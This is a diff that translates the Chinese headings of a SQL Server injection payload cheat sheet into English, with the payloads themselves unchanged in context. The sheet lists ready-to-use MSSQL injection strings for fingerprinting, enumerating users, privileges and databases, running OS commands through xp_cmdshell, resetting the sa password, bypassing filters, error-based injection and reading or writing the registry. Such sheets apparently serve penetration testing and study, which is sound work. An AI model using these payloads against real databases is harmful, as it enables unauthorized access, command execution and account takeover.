@@ -1,7 +1,7 @@
 SQL Server Payload
 ========================================
 
-常见Payload
+Common Payload
 ----------------------------------------
 - Version
     - ``SELECT @@version``
@@ -12,21 +12,21 @@ SQL Server Payload
     - ``SELECT /*comment*/1``
 - Space
     - ``0x01 - 0x20``
-- 用户信息
+- User information
     - ``SELECT user_name()``
     - ``SELECT system_user``
     - ``SELECT user``
     - ``SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID``
-- 用户权限
+- User permissions
     - ``select IS_SRVROLEMEMBER('sysadmin')``
     - ``select IS_SRVROLEMEMBER('db_owner')``
 - List User
     - ``SELECT name FROM master..syslogins``
-- 数据库信息
+- Database information
     - ``SELECT name FROM master..sysdatabases``
     - ``select concat_ws(table_schema,table_name,column_name) from information_schema.columns``
     - ``select quotename(name) from master..sysdatabases FOR XML PATH('')``
-- 执行命令
+-Execute command
     - ``EXEC xp_cmdshell 'net user'``
 - Ascii
     - ``SELECT char(0x41)``
@@ -38,20 +38,20 @@ SQL Server Payload
     - ``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``
 - Trick
     - ``id=1 union:select password from:user``
-- 文件读取
+- File reading
     - OpenRowset
-- 当前查询语句
+- Current query statement
     - ``select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)``
 - hostname
-    - 用于判断是否站库分离
+    - Used to determine whether the site and database are separated
     - ``select host_name()``
     - ``exec xp_getnetname``
-- 服务器信息
+- Server information
     - ``exec xp_msver``
-- 系统配置
+- System configuration
     - ``select * from sys.configurations;``
 
-注册表读写
+Registry reading and writing
 ----------------------------------------
 - ``xp_regread``
     - ``exec xp_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSEARCH'``
@@ -60,11 +60,11 @@ SQL Server Payload
 - ``xp_regdeletkey``
 - ``xp_regaddmultistring``
 
-报错注入
+Error injection
 ----------------------------------------
 - ``1=convert(int,(db_name()))``
 
-常用函数
+Commonly used functions
 ----------------------------------------
 - SUSER_NAME()
 - USER_NAME()
@@ -80,7 +80,7 @@ DNS OOB
 - fn_get_audit_file
 - fn_trace_gettable
 
-其他常用存储过程
+Other commonly used stored procedures
 ----------------------------------------
 - sp_execute_external_script
 - sp_makewebtask
